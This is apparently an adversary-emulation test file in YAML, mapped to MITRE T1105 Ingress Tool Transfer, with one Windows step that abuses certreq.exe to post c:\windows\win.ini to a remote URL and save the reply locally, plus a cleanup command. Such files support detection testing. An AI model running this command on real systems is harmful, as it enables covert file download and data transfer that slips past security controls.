api_version: "2.0"
name: certreq download
description: Use certreq to download a file from the web
args:
    - name: local_path
      type: string
      default: '%temp%\Atomic-license.txt'
    - name: remote_file
      type: url
      default: https://example.com
uuid: 6fdaae87-c05b-42f8-842e-991a74e8376b
mitre:
    tactics:
        - 'TA0011: Command and Control'
    techniques:
        - 'T1105: Ingress Tool Transfer'
requirements:
    platforms:
        - os: windows
steps:
    - name: certreq-download
      inline: certreq.exe -Post -config {{.Args.remote_file}} c:\windows\win.ini {{.Args.local_path}}
      executor: command_prompt
      cleanup:
        inline: del {{.Args.local_path}} >nul 2>&1
        executor: command_prompt
